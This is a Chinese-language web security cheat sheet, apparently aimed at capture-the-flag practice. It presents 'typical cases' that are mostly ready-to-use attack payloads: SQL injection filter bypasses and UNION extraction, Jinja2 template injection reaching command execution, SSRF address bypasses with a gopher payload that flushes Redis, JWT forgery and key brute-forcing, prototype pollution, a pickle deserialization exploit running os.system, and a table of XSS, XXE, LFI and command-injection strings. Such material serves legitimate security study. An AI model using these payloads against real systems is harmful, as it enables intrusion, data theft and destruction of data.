# Web 安全案例与资源

## 学习平台

| 平台 | 链接 | 内容 |
|------|------|------|
| HackTricks | https://book.hacktricks.wiki | 综合攻击知识库 |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings | Payload 大全 |
| OWASP | https://owasp.org | Web 安全标准 |

## 典型案例

### 案例 1: SQL 注入绕过 WAF
**场景**: 有 WAF 过滤的 SQL 注入
**方法**:
```sql
-- 绕过空格过滤
SELECT/**/username/**/FROM/**/users

-- 绕过引号过滤
SELECT username FROM users WHERE id=0x31  -- hex 编码

-- 绕过关键字过滤
SEL/**/ECT username FR/**/OM users

-- 使用 UNION 注入
-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()

-- 时间盲注
-1 OR IF(1=1,SLEEP(5),0)
```

### 案例 2: SSTI (服务端模板注入)
**场景**: Jinja2 模板注入
**方法**:
```python
# 检测
{{7*7}}  # 返回 49

# 读取文件
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}

# RCE
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# 绕过过滤
{{''.__class__.__mro__[1].__subclasses__()}}
```

### 案例 3: SSRF 绕过
**场景**: 有防护的 SSRF
**方法**:
```python
# 绕过 IP 过滤
http://0x7f000001  # 127.0.0.1 hex
http://2130706433  # 127.0.0.1 decimal
http://0177.0.0.1  # 127.0.0.1 octal
http://127.1        # 简写
http://localhost    # DNS 解析

# 绕过协议限制
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a  # Redis

# DNS Rebinding
# 1. 第一次解析到合法 IP
# 2. 第二次解析到 127.0.0.1
```

### 案例 4: JWT 攻击
**场景**: JWT 签名验证缺陷
**方法**:
```python
import jwt
import json
import base64

# 1. none 算法攻击
token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
# 删除签名，修改 header 为 {"alg":"none"}

# 2. HS256 -> RS256 混淆
# 修改 header 为 {"alg":"RS256"}
# 用公钥作为 HMAC 密钥签名

# 3. 弱密钥爆破
import itertools
for key in wordlist:
    try:
        jwt.decode(token, key, algorithms=['HS256'])
        print(f"Found key: {key}")
        break
    except:
        continue
```

### 案例 5: 原型污染 (Node.js)
**场景**: JSON 合并漏洞
**方法**:
```json
{
  "__proto__": {
    "isAdmin": true,
    "role": "admin"
  }
}

// 或者
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

### 案例 6: 反序列化 RCE
**场景**: Python pickle 反序列化
**方法**:
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag',))

payload = pickle.dumps(Exploit())
print(payload)  # 发送给服务端
```

## 常见 Payload 速查

| 漏洞类型 | Payload |
|----------|---------|
| XSS | `<script>alert(1)</script>` |
| SQLi | `' OR 1=1--` |
| SSTI | `{{7*7}}` |
| XXE | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` |
| SSRF | `http://127.0.0.1:8080/admin` |
| RCE | `$(cat /flag)` |
| LFI | `../../etc/passwd` |
| 反序列化 | pickle payload |
